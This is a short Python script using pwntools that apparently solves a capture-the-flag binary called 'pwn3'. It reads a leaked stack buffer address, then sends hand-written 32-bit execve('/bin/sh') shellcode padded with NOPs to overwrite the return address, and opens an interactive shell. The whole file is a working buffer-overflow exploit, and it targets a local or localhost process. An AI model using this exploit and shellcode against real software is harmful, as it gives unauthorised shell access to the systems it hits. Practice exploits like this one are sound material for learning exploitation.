#!/usr/bin/env python

from pwn import *
import sys


def main(argv):
    executable="./pwn3"
    if len(argv) < 2:
        print("Usage: "+str(argv[0]) +' <d> debug; <r> remote; <l> local')
        return
    if (argv[1] == 'd'):
        log.info("Debug")
        target = gdb.debug(executable,'''
            gef restore
            tmux-setup
            b *echo+69
            continue
            ''')
    elif (argv[1] == 'r'):
        log.info("Remote target")
        target=remote("127.0.0.1","31337")
    else:
        target=process(executable)
    target.recvuntil('journey ')
    buffer = int(target.recvline().strip()[:-1],16)
    log.success("Buffer location: "+hex(buffer))
    padding = 302
    shellcode = b'\x31\xC0\xB0\xFF\x29\xC4\x31\xC0\x50' # xor eax, eax; mov al, 0xff; sub esp, eax; xor eax, eax; push eax
    shellcode+= b'\x68\x6E\x2F\x73\x68'
    shellcode+= b'\x68\x2F\x2F\x62\x69' # push //bin/sh
    shellcode+= b'\xB0\x0B' # mov al, 0x0b
    shellcode+= b'\x89\xE3\x31\xC9\x31\xD2' # mov ebx, esp; xor ecx, ecx; xor edx, edx
    shellcode+= b'\xcd\x80' # int 0x80
    payload = shellcode + asm('nop')*(padding - len(shellcode))+p32(buffer)+b'\x0a'
    target.send(payload)
    target.interactive()
    

if __name__ == "__main__":
    main(sys.argv)
